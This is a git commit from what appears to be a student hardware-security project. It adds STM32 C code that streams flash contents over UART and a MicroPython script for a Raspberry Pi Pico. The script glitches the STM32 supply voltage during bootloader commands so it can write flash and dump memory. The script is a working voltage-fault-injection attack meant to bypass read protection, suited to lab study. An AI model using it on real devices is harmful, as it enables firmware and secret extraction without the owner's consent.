ddff6fea4fe0d0295a3037dcff6fc526c2941464
weicocogoat <97502018+weicocogoat@users.noreply.github.com>
2024-04-12 08:23:01 +0000

    Add files via upload

---
+++ Week 13/Writing to RAM/uart/uart.c
@@ -0,0 +1,267 @@
+/*
+ * uart.c
+ *
+ * Description: UART transmitter example using the PA10 pin for transmission
+ *
+ * UART setup steps:
+ *   1. Enable USARTx clock from RCC
+ *   2. Enable Alternate function clock from RCC
+ *   3. Enable the relevant GPIO clock from RCC
+ *     (Each USART module is connected to a GPIO pair.
+ *      You can map them to different pins if supported)
+ *   4. Make the GPIO pins alternate-function push-pull output
+ *   5. Remap the pins if needed from AFIO->MAPR
+ *   6. Enable USART module from CR1
+ *   7. Set number of data bits from CR1
+ *   8. Set number of stop bits from CR2
+ *   9. Set baud rate from BRR
+ *   10. Enable transmitter and receiver from CR1
+ *   11. Open a terminal and run 'screen /dev/tty.??? 9600'
+ *     /dev/tty.??? is the serial port you got on osx / linux when you
+ *
+ * Author: Furkan Cayci
+ *
+ *  Project Setup:
+ *   EasyMX Pro V7 board
+ *   Cortex-M3 arch
+ *   STM32F107 chip
+ */
+
+/*************************************************
+* Definitions
+*************************************************/
+// This section can go into a header file if wanted
+// Define some types for readibility
+#define int32_t         int
+#define int16_t         short
+#define int8_t          char
+#define uint32_t        unsigned int
+#define uint16_t        unsigned short
+#define uint8_t         unsigned char
+
+#define HSE_Value       ((uint32_t) 25000000) /* Value of the External oscillator in Hz */
+#define HSI_Value       ((uint32_t)  8000000) /* Value of the Internal oscillator in Hz*/
+
+// Define the base addresses for peripherals
+#define PERIPH_BASE     ((uint32_t) 0x40000000)
+#define SRAM_BASE       ((uint32_t) 0x20000000)
+
+#define APB1PERIPH_BASE PERIPH_BASE
+#define APB2PERIPH_BASE (PERIPH_BASE + 0x10000)
+#define AHBPERIPH_BASE  (PERIPH_BASE + 0x20000)
+
+#define AFIO_BASE       (APB2PERIPH_BASE + 0x0000) //   AFIO base address is 0x40010000
+#define GPIOA_BASE      (APB2PERIPH_BASE + 0x0800) //  GPIOA base address is 0x40010800
+#define USART1_BASE     (APB2PERIPH_BASE + 0x3800) // USART1 base address is 0x40013800
+
+#define RCC_BASE        ( AHBPERIPH_BASE + 0x1000) //   RCC base address is 0x40021000
+#define FLASH_BASE      ( AHBPERIPH_BASE + 0x2000) // FLASH base address is 0x40022000
+
+#define NVIC_BASE       ((uint32_t) 0xE000E100)
+
+#define STACKINIT       0x20005000
+#define DELAY           7200000
+
+#define AFIO            ((AFIO_type  *)   AFIO_BASE)
+#define GPIOA           ((GPIO_type  *)  GPIOA_BASE)
+#define RCC             ((RCC_type   *)    RCC_BASE)
+#define FLASH           ((FLASH_type *) FLASH_BASE)
+#define USART1          ((USART_type *) USART1_BASE)
+#define NVIC            ((NVIC_type  *)   NVIC_BASE)
+
+/*
+ * Register Addresses
+ */
+typedef struct
+{
+	uint32_t CRL;      /* GPIO port configuration register low,      Address offset: 0x00 */
+	uint32_t CRH;      /* GPIO port configuration register high,     Address offset: 0x04 */
+	uint32_t IDR;      /* GPIO port input data register,             Address offset: 0x08 */
+	uint32_t ODR;      /* GPIO port output data register,            Address offset: 0x0C */
+	uint32_t BSRR;     /* GPIO port bit set/reset register,          Address offset: 0x10 */
+	uint32_t BRR;      /* GPIO port bit reset register,              Address offset: 0x14 */
+	uint32_t LCKR;     /* GPIO port configuration lock register,     Address offset: 0x18 */
+} GPIO_type;
+
+typedef struct
+{
+	uint32_t SR;       /* Address offset: 0x00 */
+	uint32_t DR;       /* Address offset: 0x04 */
+	uint32_t BRR;      /* Address offset: 0x08 */
+	uint32_t CR1;      /* Address offset: 0x0C */
+	uint32_t CR2;      /* Address offset: 0x10 */
+	uint32_t CR3;      /* Address offset: 0x14 */
+	uint32_t GTPR;     /* Address offset: 0x18 */
+} USART_type;
+
+typedef struct
+{
+	uint32_t CR;       /* RCC clock control register,                Address offset: 0x00 */
+	uint32_t CFGR;     /* RCC clock configuration register,          Address offset: 0x04 */
+	uint32_t CIR;      /* RCC clock interrupt register,              Address offset: 0x08 */
+	uint32_t APB2RSTR; /* RCC APB2 peripheral reset register,        Address offset: 0x0C */
+	uint32_t APB1RSTR; /* RCC APB1 peripheral reset register,        Address offset: 0x10 */
+	uint32_t AHBENR;   /* RCC AHB peripheral clock enable register,  Address offset: 0x14 */
+	uint32_t APB2ENR;  /* RCC APB2 peripheral clock enable register, Address offset: 0x18 */
+	uint32_t APB1ENR;  /* RCC APB1 peripheral clock enable register, Address offset: 0x1C */
+	uint32_t BDCR;     /* RCC backup domain control register,        Address offset: 0x20 */
+	uint32_t CSR;      /* RCC control/status register,               Address offset: 0x24 */
+	uint32_t AHBRSTR;  /* RCC AHB peripheral clock reset register,   Address offset: 0x28 */
+	uint32_t CFGR2;    /* RCC clock configuration register 2,        Address offset: 0x2C */
+} RCC_type;
+
+typedef struct
+{
+	uint32_t ACR;
+	uint32_t KEYR;
+	uint32_t OPTKEYR;
+	uint32_t SR;
+	uint32_t CR;
+	uint32_t AR;
+	uint32_t RESERVED;
+	uint32_t OBR;
+	uint32_t WRPR;
+} FLASH_type;
+
+typedef struct
+{
+	uint32_t EVCR;      /* Address offset: 0x00 */
+	uint32_t MAPR;      /* Address offset: 0x04 */
+	uint32_t EXTICR1;   /* Address offset: 0x08 */
+	uint32_t EXTICR2;   /* Address offset: 0x0C */
+	uint32_t EXTICR3;   /* Address offset: 0x10 */
+	uint32_t EXTICR4;   /* Address offset: 0x14 */
+	uint32_t MAPR2;     /* Address offset: 0x18 */
+} AFIO_type;
+
+
+// Function declarations. Add your functions here
+//void copy_data(void);
+void set_system_clock_to_8Mhz(void);
+int32_t main(void);
+
+/*************************************************
+* Vector Table
+*************************************************/
+// Attribute puts table in beginning of .vector section
+//   which is the beginning of .text section in the linker script
+// Add other vectors in order here
+// Vector table can be found on page 197 in RM0008
+uint32_t (* const vector_table[])
+__attribute__ ((section(".vectors"))) = {
+	(uint32_t *) STACKINIT,         /* 0x000 Stack Pointer                   */
+	(uint32_t *) main,              /* 0x004 Reset                           */
+};
+
+/*************************************************
+* Copy the data contents from LMA to VMA (Load Memory Address | Virtual Memory Address)
+*************************************************/
+/*
+void copy_data(void)
+{
+	extern char _etext, _sdata, _edata, _sbss, _ebss;
+	char *src = &_etext;
+	char *dst = &_sdata;
+
+	// ROM has data at end of text; copy it.  
+	while (dst < &_edata)
+		*dst++ = *src++;
+
+	// Zero bss.  
+	for (dst = &_sbss; dst< &_ebss; dst++)
+		*dst = 0;
+}
+*/
+
+void set_system_clock_to_8Mhz(void)
+{
+	// Enable HSI
+	RCC->CR |= 1;
+	// Wait untill HSI settles down
+	while (!(RCC->CR & (1 << 1)));
+	
+	// Finally, choose HSI as the system clock
+	RCC->CFGR |= (0b00 << 0);
+
+}
+
+/*************************************************
+* Main code starts from here
+*************************************************/
+int32_t main(void)
+{
+	// Copy LMA to VMA for data section
+	//copy_data();
+
+	// Set clock to 8 MHz
+	set_system_clock_to_8Mhz();
+
+	/*
+	During the De-init sequence, only RCC->CR, RCC->CFGR, Systick CTRL registers were affected
+	Other peripherals were not affected, including AFIO, APB, USART configs
+	Additionally, RCC->CR and RCC-> CFRG was already set when changing the system clock to utilize HSI clock. Therefore, no need to init it again (we also dont use PLL, saving code space) 
+	*/
+	
+	/*
+	// RCC->APB2ENR bit 2 and 14 was already set in the initialization and was not de-init. Maybe only bit 0 needs to be re-init
+	// Enable alternate function clock. Bit 0 in RCC APB2ENR register
+	RCC->APB2ENR |= (1 << 0);
+	// Enable GPIOA clock. Bit 2 in RCC APB2ENR register
+	RCC->APB2ENR |= (1 << 2);
+	// Enable clock for UART1 clock. Bit 14 in RCC APB2ENR register
+	RCC->APB2ENR |= (1 << 14);
+	*/
+	
+	
+	
+	// Make GPIOA Pin 9,10 (PA9, PA10) alternate-function output (0b1010)
+	GPIOA->CRH &= 0xFFFFF00F;
+	GPIOA->CRH |= 0x00000BB0;
+	
+
+	// Enable USART
+	//USART1->CR1 |= (1 << 13);
+	// Word length - leave default (8 data)
+	//USART1->CR1 |= (0 << 12);
+	// Number of stop bits - leave default (1 stop)
+	//USART1->CR2 |= (0b00 << 12);
+	// Baud rate
+	// BRR should be 52 + 1/12 for 9600 baud rate
+	// Thus manista is 52 (0x034) and fraction is 12 (0x1) (1/16)
+	// Making it 0x0341
+	USART1->BRR = 0x0341;
+	// Transmitter enable
+	//USART1->CR1 |= (1 << 3);
+	// Receiver enable
+	//USART1->CR1 |= (1 << 2);
+
+	volatile uint32_t *addr = (uint32_t*) 0x08000000; 
+	uint32_t value = *addr;
+	uint8_t value_8bit;
+	
+	// for some reason, when nrst is pressed, the first byte does not get transmitted
+	// therefore, this is a placeholder to make sure that data does not get lost during testing
+	// Might remove this later if needed
+	value_8bit = (value>>24);
+	USART1->DR |= value_8bit;
+	while(!(USART1->SR & (1 << 6)));
+	
+	while(1)
+	{
+		for(int i=1000000; i>0; i--);
+		
+		for (int i = 4; i > 0; i--){
+			value_8bit = (value >> (8*(i-1)) );
+			USART1->DR |= value_8bit;
+			while(!(USART1->SR & (1 << 6)));
+		}
+		
+		addr = addr + 1;
+		value = *addr;
+		
+		
+	}
+
+	// Should never reach here
+	return 0;
+}
---
+++ Week 13/Writing to flash/vfi_mem_dump_flash.py
@@ -0,0 +1,262 @@
+import time, sys, uselect, struct, math
+from machine import Pin, UART
+from rp2 import PIO, asm_pio, StateMachine
+
+# Set the Gate of the Driver MOSFET to HIGH for a short period, driving the voltage down. Glitches the STM32. (See sketch schematics)
+@asm_pio(set_init = rp2.PIO.OUT_LOW, out_shiftdir=PIO.SHIFT_RIGHT, autopull=True, pull_thresh=16)
+def drop_voltage():
+    # Delay and Glitch durations are all inside the 32bit string.
+    # Bits 0-4 is used for delay duration (32 cycle loop)
+    # Bits 5-9 is used for delay duration (2 cycle loop)
+    # Bits 10-14 is used for glitch duration
+    pull()
+    mov(isr, osr)
+    
+    # Start of program
+    label("Prog_Start")
+    
+    set(x, 4)
+    # Waits for the 6th Rising Edge from Pin 4 before glitching with Pin 3
+    label("rising_edge_wait")
+    wait(1, pin, 0)
+    wait(0, pin, 0)
+    jmp(x_dec, "rising_edge_wait")
+    
+    wait(1, pin, 0)
+    
+    # Initial delay. Area to glitch is ard 35us. User input delay can go up to ~10us
+    # Therefore, an initial delay of 30us is needed
+    # The code below delays for 100 cycles
+    set(x, 30)
+    label("initial_delay")
+    nop()		[9]
+    nop()		[29]
+    nop()		[29]
+    nop()		[28]
+    jmp(x_dec, "initial_delay")
+    
+
+    # Move/Reloads the glitch timing and delay into the x and y registers
+    out(x, 5)		#x contains the delay duration (2 cycle loop) 
+    out(y, 5)		#y contains the delay duration (32 cycle loop)
+    #nop()			#The 5 LSB of OSR should now contain the glitch duration
+    
+    # 2 cycle delay
+    label("delay_short")
+    nop()		
+    jmp(x_dec, "delay_short")
+    
+    #nop()
+    
+    # Skips 32 cycle delay and goes to glitch
+    jmp(not_y, "Glitch")
+    
+    # 32 cycle delay
+    label("delay_long")
+    nop()		[30]
+    jmp(y_dec, "delay_long")
+    
+    label("Glitch")
+    # Moves the glitch timing to scratch register X
+    mov(x, osr)
+    
+    # Set Pin 3 to High. Induces Glitch
+    set(pins, 1)
+    
+    # Glitch timing
+    label("glitch_timing")
+    nop()
+    jmp(x_dec, "glitch_timing")
+    
+    nop()
+
+    # Set Pin 3 to Low. Return opertaions as per normal
+    set(pins, 0)
+    
+    # Delay to allow the STM to get back to operating voltage
+    set(x, 31)
+    label("delay_low_outer")
+    #set(y, 2)
+    #label("delay_low_inner")
+    nop()			[31]
+    #jmp(y_dec, "delay_low_inner")
+    jmp(x_dec, "delay_low_outer")
+    
+    # Reloads the original value back into OSR
+    mov(osr, isr)
+    # Wait for Falling edge so the PIO does not continually glitch
+    #wait(0, pin, 0)
+    jmp("Prog_Start")
+    
+@asm_pio(set_init = rp2.PIO.OUT_LOW, out_shiftdir=PIO.SHIFT_RIGHT, autopull=True, pull_thresh=16)
+def reset():
+    set(pins, 1)
+    nop()		[31]
+    set(pins, 0)
+    nop()		[31]    
+
+# Set Pin 3 output drive strength to be 12mA, slew to be fast. Refer to rp2040 datasheet, PADS_BANK0
+machine.mem32[0x4001c010]=0x7f
+
+# Open a file from the Pico's onchip flash memory
+fd = open("output.txt", "a")
+
+#Reset_Flag
+rst_flag = 0
+
+# Bit String
+bit_string = 0
+
+# Switch ON the on-board LED.
+led = Pin("LED", Pin.OUT)
+led.value(1)
+
+# NRST for STM32
+NRST = Pin(10, Pin.OUT)
+NRST.value(1)
+
+# Initialize UART
+# When connected in Normal operation, parity = None
+# When connected in Bootloader mode, partity = 0 (EVEN)
+uart = UART(0, baudrate=115200, tx=Pin(12), rx=Pin(13))
+uart.init(bits=8, parity=0, stop=1)
+
+# Sets up the comms btw Pico and Thonny IDE
+spoll=uselect.poll()
+spoll.register(sys.stdin,uselect.POLLIN)
+
+# Command to enter bootloader mode
+cmd = struct.pack('B', 0x7f)
+uart.write(cmd)
+received = struct.unpack('b', uart.read())
+print(hex(received))
+
+def read1():
+    return(sys.stdin.read(1) if spoll.poll(0) else None)
+
+def readline():
+    c = read1()
+    buffer = ""
+    while c != None:
+        buffer += c
+        c = read1()
+    return buffer             
+
+
+def calc_glitch_cycles(duration):
+    #nop() [11] gives a reliable glitch time of 160ns. Each extra clock cycle adds 10ns.
+    cycles = 5 + (int(duration) - 160) / 20
+    return cycles
+
+
+while True:
+    for i in range (140, 160, 20): #glitch duration. Accurate to ~20ns
+        for j in range(5100, 5400, 20): #delay duration. Accurate to ~20ns. Maximum up to 10700
+
+            t_end = time.time() + 2
+            #fd.write(f"Glitch duration: {i}, Delay Duration {j} \n")
+            
+            glitch_cycles = calc_glitch_cycles(i)
+            bit_string = int(glitch_cycles) << 10		#Logical shift left by 10 bits
+            #print(glitch_cycles)
+            print(f"Glitch duration: {i}")
+            print(f"Delay duration: {j}")
+            
+            if (j < 780):
+                #~90ns of delay is due to current travel time(?). Was mentioned before in one of the meetings. 
+                delay_cycles = (j - 140 )/20	# At least 4 cycles is being used for delay. 
+                bit_string = bit_string + int(delay_cycles)		# No need to shift 2 cycle delay as they are the 5 LSB
+            else:
+                long_delay_cycles = math.floor((j - 140) / 320) 
+                delay_cycles = math.floor((j - (long_delay_cycles *320) - 110 ) / 20) #~90ns of delay + 10ns of delay to copy osr into x
+                long_delay_cycles = long_delay_cycles - 1 # Loops in PIO index starts at 0
+                delay_cycles = delay_cycles -1
+                bit_string = bit_string + (long_delay_cycles << 5)
+                bit_string = bit_string + delay_cycles
+                #print(f"long delay cycle: {long_delay_cycles}")
+            #print(f"Delay Cycles: {delay_cycles}")
+            print(f"Bit_string: {bit_string}")
+            print("")
+            
+            sm = StateMachine(0, drop_voltage, freq = 100_000_000, set_base = Pin(3), in_base = Pin(4))
+            sm.put(bit_string)
+            sm.active(1) #******************************************************************************************************************
+
+            while time.time() < t_end:
+                # Read Memory Commands Start
+                try:
+                    # Select Write Memory Command & trigger rising edge
+                    cmd = struct.pack('B', 0x21)
+                    uart.write(cmd)
+                    cmd = struct.pack('B', 0xDE)
+                    uart.write(cmd)
+                    
+                    received, = struct.unpack('b', uart.read())
+                    
+                    # Checks if ACK or NACK is sent. If NACK is received, does not enter if statement and tries to glitch again
+                    
+                    if (received == -1 or received == 1):
+                        print(f"Glitched: {received}")
+
+                        continue
+
+                    if (received != 0x1f):
+                        # ACK is received
+                        print("Glitched")
+                        print(received)
+                        
+                        #stop the SM from glitching
+                        sm.active(0)
+                        
+                        # Write to memory addres 0x0x0801_FC00
+                        cmd = struct.pack('B', 0x08)
+                        uart.write(cmd)
+                        cmd = struct.pack('B', 0x01)
+                        uart.write(cmd)
+                        cmd = struct.pack('B', 0xFC)
+                        uart.write(cmd)
+                        cmd = struct.pack('B', 0x00)
+                        uart.write(cmd)
+                        cmd = struct.pack('B', 0xF5)
+                        uart.write(cmd)
+                        time.sleep(0.01)
+                        
+                        received, = struct.unpack('b', uart.read())
+                        print(received)
+                        if (received != 121):
+                            continue
+                        print("Bruh")
+                        
+                        uart = UART(0, baudrate=9600, tx=Pin(12), rx=Pin(13))
+                        uart.init(bits=8, parity=0, stop=1)
+                        
+                        time.sleep(0.01)
+                        
+                        while True:
+                            if uart.any():
+                                try:
+                                    data = uart.read().hex()
+                                    
+                                    print(data)
+                                except:
+                                    data = uart.read()
+                                    print(data)
+
+                        sys.exit()
+                    
+                        
+                    print(received)
+                    time.sleep(0.01)
+                    
+                except:
+                    print("reset")
+                    NRST.value(0)
+                    time.sleep(0.5)
+                    NRST.value(1)
+                    time.sleep(0.5)
+                    cmd = struct.pack('B', 0x7f)
+                    uart.write(cmd)
+                    received = struct.unpack('b', uart.read())
+                    print(hex(received))
+            
+                        
